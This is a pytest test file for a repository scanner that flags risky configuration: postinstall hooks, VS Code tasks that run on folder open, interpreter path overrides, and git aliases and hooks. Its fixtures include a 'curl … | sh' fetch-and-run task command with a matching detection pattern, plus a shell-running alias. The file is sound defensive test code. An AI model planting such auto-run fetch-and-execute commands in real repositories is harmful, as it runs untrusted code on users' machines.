import pytest

from helpers import run_check
from repovet.engine.checks.base import CheckError
from repovet.engine.checks.keypath import parse_path


def test_exists_on_json() -> None:
    text = '{\n  "scripts": {\n    "postinstall": "node x.js"\n  }\n}'
    spec = {"type": "keypath", "format": "json", "paths": ["scripts.postinstall"]}
    (match,) = run_check(spec, "package.json", text)
    assert match.line == 3
    assert match.values == {"key": "postinstall", "value": "node x.js", "match": "node x.js"}
    assert match.evidence == '    "postinstall": "node x.js"'


def test_wildcards_and_equals() -> None:
    text = (
        '{"tasks": [{"runOptions": {"runOn": "default"}}, {"runOptions": {"runOn": "folderOpen"}}]}'
    )
    spec = {
        "type": "keypath",
        "format": "json",
        "paths": ["tasks.*.runOptions.runOn"],
        "equals": "folderOpen",
    }
    (match,) = run_check(spec, ".vscode/tasks.json", text)
    assert match.values["value"] == "folderOpen"


def test_equals_is_type_strict() -> None:
    spec = {"type": "keypath", "format": "json", "paths": ["a"], "equals": True}
    assert run_check(spec, "x.json", '{"a": true}')
    assert not run_check(spec, "x.json", '{"a": 1}')


def test_escaped_dots_in_keys() -> None:
    text = '{"python.defaultInterpreterPath": "./evil/python.exe", "go.executablePath": "x"}'
    spec = {
        "type": "keypath",
        "format": "jsonc",
        "paths": ["python\\.defaultInterpreterPath", "*\\.executablePath"],
    }
    keys = {m.values["key"] for m in run_check(spec, ".vscode/settings.json", text)}
    assert keys == {"python.defaultInterpreterPath", "go.executablePath"}


def test_value_regex_and_lists() -> None:
    text = '{"mcp": {"args": ["-y", "pkg@latest"]}}'
    spec = {"type": "keypath", "format": "json", "paths": ["mcp.args"], "value_regex": "-y"}
    (match,) = run_check(spec, "a.json", text)
    assert match.values["value"] == "-y pkg@latest"


def test_not_in_on_toml() -> None:
    text = '[build-system]\nrequires = ["x"]\nbuild-backend = "custom_backend"\n'
    spec = {
        "type": "keypath",
        "format": "toml",
        "paths": ["build-system.build-backend"],
        "not_in": ["hatchling.build", "setuptools.build_meta"],
    }
    (match,) = run_check(spec, "pyproject.toml", text)
    assert match.line == 3
    ok = text.replace("custom_backend", "hatchling.build")
    assert not run_check(spec, "pyproject.toml", ok)


def test_yaml_format() -> None:
    spec = {"type": "keypath", "format": "yaml", "paths": ["yarnPath"]}
    (match,) = run_check(spec, ".yarnrc.yml", "nodeLinker: pnp\nyarnPath: .yarn/x.cjs\n")
    assert match.line == 2


def test_parse_errors_give_no_match() -> None:
    spec = {"type": "keypath", "format": "json", "paths": ["a"]}
    assert not run_check(spec, "a.json", "{not json")


def test_parse_path() -> None:
    assert [w.pattern for w in parse_path("a.b\\.c.*")] == ["a", "b.c", "*"]
    with pytest.raises(CheckError):
        parse_path("a..b")


@pytest.mark.parametrize(
    "spec",
    [
        {"type": "keypath", "paths": ["a"]},
        {"type": "keypath", "format": "ini", "paths": ["a"]},
        {"type": "keypath", "format": "json"},
        {"type": "keypath", "format": "json", "paths": ["a"], "equals": "x", "not_in": ["y"]},
        {"type": "keypath", "format": "json", "paths": ["a"], "exists": False},
        {"type": "keypath", "format": "json", "paths": ["a"], "equals": ["x"]},
        {"type": "keypath", "format": "json", "paths": [{"value_regex": "x"}]},
        {"type": "keypath", "format": "json", "paths": [{"path": "a", "colour": "red"}]},
        {"type": "keypath", "format": "json", "paths": [3]},
        {"type": "keypath", "format": "json", "paths": ["a"], "where": []},
        {"type": "keypath", "format": "json", "paths": ["a"], "where": [{"equals": 1}]},
    ],
)
def test_invalid_specs(spec: dict[str, object]) -> None:
    with pytest.raises(CheckError):
        run_check(spec, "a.json", "{}")


def test_per_path_conditions_override_the_default() -> None:
    text = '{"alias": {"st": "status", "x": "!sh run.sh"}, "core": {"pager": "less"}}'
    spec = {
        "type": "keypath",
        "format": "json",
        "paths": ["core.pager", {"path": "alias.*", "value_regex": "^!"}],
    }
    found = {(m.values["key"], m.values["value"]) for m in run_check(spec, "c.json", text)}
    assert found == {("pager", "less"), ("x", "!sh run.sh")}


def test_where_conditions_and_flattened_objects() -> None:
    text = """{
  "tasks": [
    {"label": "a", "command": "curl -s https://example.invalid/a | sh"},
    {"label": "b",
     "command": "curl -s https://example.invalid/b | sh",
     "runOptions": {"runOn": "folderOpen"}}
  ]
}"""
    spec = {
        "type": "keypath",
        "format": "json",
        "paths": ["tasks.*"],
        "where": [{"path": "runOptions.runOn", "equals": "folderOpen"}],
        "value_regex": r"curl\S* [^|]*\| *sh",
    }
    (match,) = run_check(spec, ".vscode/tasks.json", text)
    assert match.values["match"] == "curl -s https://example.invalid/b | sh"
    assert match.values["value"].startswith("b curl -s")
    assert match.line == 5


def test_git_config_format() -> None:
    spec = {"type": "keypath", "format": "gitconfig", "paths": ["core.hookspath"]}
    (match,) = run_check(spec, ".git/config", "[core]\n\tbare = false\n\thooksPath = h\n")
    assert (match.line, match.values["value"]) == (3, "h")


def test_flatten_budget() -> None:
    from repovet.engine.checks.keypath import flatten

    assert flatten({"a": [1, {"b": "x"}], "c": True}) == "1 x true"
    assert flatten(list(range(100)), budget=10) == "0 1 2 3 4 5 6 7 8"
